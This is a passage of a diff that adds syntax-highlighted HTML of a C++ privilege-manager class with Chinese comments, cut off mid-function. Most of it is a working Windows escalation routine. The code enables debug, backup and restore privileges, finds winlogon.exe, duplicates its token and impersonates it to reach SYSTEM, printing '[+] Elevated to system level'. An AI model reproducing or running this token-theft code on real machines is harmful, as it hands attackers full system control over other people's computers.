+<span class="line"><span style="color:#6A737D">    // 启用特定特权</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">InternalEnablePrivilege</span><span style="color:#E1E4E8">(privilegeName)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_enabledPrivileges.</span><span style="color:#B392F0">push_back</span><span style="color:#E1E4E8">(privilegeName);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 禁用特定特权</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> DisablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> InternalDisablePrivilege</span><span style="color:#E1E4E8">(privilegeName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查特权是否启用</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> IsPrivilegeEnabled</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> InternalCheckPrivilege</span><span style="color:#E1E4E8">(privilegeName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取令牌统计信息</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> GetTokenStatistics</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_STATISTICS stats;</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD returnLength;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetTokenInformation</span><span style="color:#E1E4E8">(m_hCurrentToken, TokenStatistics, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">stats, </span></span>
+<span class="line"><span style="color:#F97583">                               sizeof</span><span style="color:#E1E4E8">(stats), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">returnLength)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Token Statistics:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  Authentication ID: </span><span style="color:#79B8FF">%08X</span><span style="color:#9ECBFF">-</span><span style="color:#79B8FF">%08X\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                   stats.AuthenticationId.HighPart, stats.AuthenticationId.LowPart);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  Token Type: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                   (stats.TokenType </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> TokenPrimary) </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "Primary"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "Impersonation"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  Privileges: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, stats.PrivilegeCount);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  Groups: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, stats.GroupCount);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 列出所有启用的特权</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> ListEnabledPrivileges</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Enabled Privileges:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"------------------</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">const</span><span style="color:#F97583"> auto&#x26;</span><span style="color:#E1E4E8"> privilege : m_enabledPrivileges) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, privilege.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化管理器</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> Initialize</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_ALL_ACCESS, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">m_hCurrentToken)) {</span></span>
+<span class="line"><span style="color:#6A737D">            // 检测当前提权级别</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_currentLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> DetectCurrentLevel</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 清理资源</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> Cleanup</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_hCurrentToken) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(m_hCurrentToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_hCurrentToken </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检测当前提权级别</span></span>
+<span class="line"><span style="color:#B392F0">    ElevationLevel</span><span style="color:#B392F0"> DetectCurrentLevel</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::None;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 检查完整性级别</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD integrityLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetIntegrityLevel</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (integrityLevel </span><span style="color:#F97583">>=</span><span style="color:#E1E4E8"> SECURITY_MANDATORY_SYSTEM_RID) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::System;</span></span>
+<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (integrityLevel </span><span style="color:#F97583">>=</span><span style="color:#E1E4E8"> SECURITY_MANDATORY_HIGH_RID) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::High;</span></span>
+<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (integrityLevel </span><span style="color:#F97583">>=</span><span style="color:#E1E4E8"> SECURITY_MANDATORY_MEDIUM_RID) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::Medium;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::None;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取完整性级别</span></span>
+<span class="line"><span style="color:#B392F0">    DWORD</span><span style="color:#B392F0"> GetIntegrityLevel</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD tokenInfoLength </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">        GetTokenInformation</span><span style="color:#E1E4E8">(m_hCurrentToken, TokenIntegrityLevel, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PTOKEN_MANDATORY_LABEL tokenLabel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PTOKEN_MANDATORY_LABEL)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(tokenInfoLength);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">tokenLabel) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetTokenInformation</span><span style="color:#E1E4E8">(m_hCurrentToken, TokenIntegrityLevel, tokenLabel, </span></span>
+<span class="line"><span style="color:#E1E4E8">                               tokenInfoLength, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#E1E4E8">            DWORD integrityLevel </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#B392F0">GetSidSubAuthority</span><span style="color:#E1E4E8">(tokenLabel->Label.Sid, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            free</span><span style="color:#E1E4E8">(tokenLabel);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> integrityLevel;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(tokenLabel);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 提升到中等级别</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> ElevateToMedium</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 中等级别通常是默认状态，无需特殊操作</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_currentLevel </span><span style="color:#F97583">>=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::Medium) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 尝试启用常用特权</span></span>
+<span class="line"><span style="color:#B392F0">        EnablePrivilege</span><span style="color:#E1E4E8">(SE_CHANGE_NOTIFY_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_currentLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::Medium;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 提升到高级别</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> ElevateToHigh</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_currentLevel </span><span style="color:#F97583">>=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::High) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 启用调试权限</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">EnablePrivilege</span><span style="color:#E1E4E8">(SE_DEBUG_NAME)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 启用备份/恢复权限</span></span>
+<span class="line"><span style="color:#B392F0">        EnablePrivilege</span><span style="color:#E1E4E8">(SE_BACKUP_NAME);</span></span>
+<span class="line"><span style="color:#B392F0">        EnablePrivilege</span><span style="color:#E1E4E8">(SE_RESTORE_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        m_currentLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::High;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 提升到系统级别</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> ElevateToSystem</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_currentLevel </span><span style="color:#F97583">>=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::System) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取系统令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hSystemToken </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemToken</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hSystemToken) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 应用系统令牌</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ImpersonateLoggedOnUser</span><span style="color:#E1E4E8">(hSystemToken)) {</span></span>
+<span class="line"><span style="color:#6A737D">            // 更新当前令牌句柄</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (m_hCurrentToken) {</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(m_hCurrentToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_hCurrentToken </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hSystemToken;</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_currentLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::System;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Elevated to system level</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hSystemToken);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取系统令牌</span></span>
+<span class="line"><span style="color:#B392F0">    HANDLE</span><span style="color:#B392F0"> GetSystemToken</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 查找winlogon进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD winlogonPid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> FindProcessId</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"winlogon.exe"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (winlogonPid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 打开进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hProcess </span><span style="color:#F97583">=</span><span style="color:#B392F0"> OpenProcess</span><span style="color:#E1E4E8">(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hProcess) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 打开令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(hProcess, TOKEN_DUPLICATE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hDupToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">DuplicateTokenEx</span><span style="color:#E1E4E8">(hToken, TOKEN_ALL_ACCESS, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                             SecurityImpersonation, TokenImpersonation, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hDupToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> hDupToken;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 查找进程ID</span></span>
+<span class="line"><span style="color:#B392F0">    DWORD</span><span style="color:#B392F0"> FindProcessId</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> processName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hSnapshot </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateToolhelp32Snapshot</span><span style="color:#E1E4E8">(TH32CS_SNAPPROCESS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hSnapshot </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PROCESSENTRY32 pe32 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        pe32.dwSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(PROCESSENTRY32);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32First</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32)) {</span></span>
+<span class="line"><span style="color:#F97583">            do</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">_stricmp</span><span style="color:#E1E4E8">(pe32.szExeFile, processName) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">                    CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#E1E4E8"> pe32.th32ProcessID;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32Next</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32));</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 内部启用特权</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> InternalEnablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_PRIVILEGES tp;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
